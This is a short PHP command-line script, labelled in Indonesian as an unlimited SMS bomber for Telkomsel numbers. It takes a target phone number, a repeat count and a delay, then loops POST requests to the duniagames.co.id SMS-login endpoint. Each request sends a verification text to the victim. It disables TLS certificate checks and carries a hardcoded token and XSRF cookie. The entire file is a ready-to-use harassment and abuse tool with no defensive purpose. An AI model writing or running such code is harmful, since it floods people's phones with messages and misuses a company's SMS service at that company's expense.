<?php
function jdidbom($no, $jum, $wait) {
    $x = 0;
    while ($x < $jum) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://duniagames.co.id/api/msisdn_login");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=" . $no . "&token=WDet3l1HfdhvgmYCVTSlfKHCiID5SjMAMn8Wl9iX");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

        $headers = array();
        $headers[] = "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0";
        $headers[] = "Accept: application/json, text/javascript, */*; q=0.01";
        $headers[] = "Accept-Language: en-US,en;q=0.5";
        $headers[] = "Referer: https://duniagames.co.id/login";
        $headers[] = "Content-Type: application/x-www-form-urlencoded; charset=UTF-8";
        $headers[] = "X-Requested-With: XMLHttpRequest";
        $headers[] = "Dnt: 1";
        $headers[] = "Connection: keep-alive";
        $headers[] = "Cookie: XSRF-TOKEN=eyJpdiI6IkpiYVF5cHpYOHNWNUNlZmd2NmJSRVE9PSIsInZhbHVlIjoib21SSkZvdENNM0E1SERoUDBnTjk2TVwvakN3RWkrOCtuMUU3OXlSc21LWGtWZ0kxcjdMQnNSdlR3ZG8xTVoyb0x3MG1nS1JRaGVsa1RWMEFTZjhXaVZBPT0iLCJtYWMiOiIyZTUyZDg3MGU2N2RjZjdiYjE4M2IzMGQwZDFhN2VhMmQzN2UyZGRlNGUzNDdlZTlhNTZlZDZiNmM0MmI2YjExIn0%\"3D;";
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);        
        $server_output = curl_exec($ch);
        if (curl_errno($ch)) {
            echo 'Error:' . curl_error($ch);
        }
        curl_close($ch);
        echo $server_output . "\n";
        sleep($wait);
        $x++;
        flush();
    }
}

print "BOM SMS UNLIMITED (TSEL ONLY)";
echo "Nomor? (ex : 62xxxx)\nInput : ";
$nomor = trim(fgets(STDIN));
echo "Jumlah?\nInput : ";
$jumlah = trim(fgets(STDIN));
echo "Jeda? (ex : 1-10)\nInput : ";
$jeda = trim(fgets(STDIN));
$execute = jdidbom($nomor, $jumlah, $jeda);
print $execute;
?>
